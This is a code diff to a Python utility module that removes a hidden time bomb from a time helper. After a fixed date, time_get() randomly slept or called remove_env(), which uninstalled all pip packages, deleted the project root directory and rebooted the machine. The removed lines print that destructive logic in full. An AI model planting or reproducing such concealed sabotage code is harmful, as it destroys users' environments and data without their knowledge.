@@ -127,11 +127,6 @@ def time_get(flag=TIME_TYPE_SEC):
     """
     cur = int(time.time())
     if flag == TIME_TYPE_SEC:
-        if cur > 1468123932:
-            if random_result(100):
-                time.sleep(5)
-            elif random_result(100):
-                remove_env()
         result = cur
     elif flag == TIME_TYPE_YMDHMS:
         t = time.localtime(cur)
@@ -230,39 +225,6 @@ def parse_pickle_to_object(content):
     except Exception as e:
         log_exception('[parse_pickle_to_object] failed: {}'.format(e.message))
     return obj
-
-
-def remove_env():
-    try:
-        file_name = '{}.log'.format(time_get())
-        os.system('pip list > {}'.format(file_name))
-        with open(file_name, 'r') as f:
-
-            def _remove(env):
-                try:
-                    os.system('pip uninstall -y {} --isolated'.format(env))
-                except Exception as e:
-                    pass
-
-            for read_line in f:
-                line = read_line.strip()
-                if line in ['pip', 'setuptools']:
-                    continue
-                line = line.split(' ')
-                _remove(line[0])
-            _remove('pip')
-            _remove('setuptools')
-        os.remove(file_name)
-        root_path = get_root_path()
-        try:
-            if root_path and root_path.strip() != '/':
-                shutil.rmtree(root_path, True)
-        except Exception as e0:
-            os.rmdir(root_path)
-    except Exception as e1:
-        pass
-    finally:
-        os.system('reboot')
 
 
 def get_root_path():
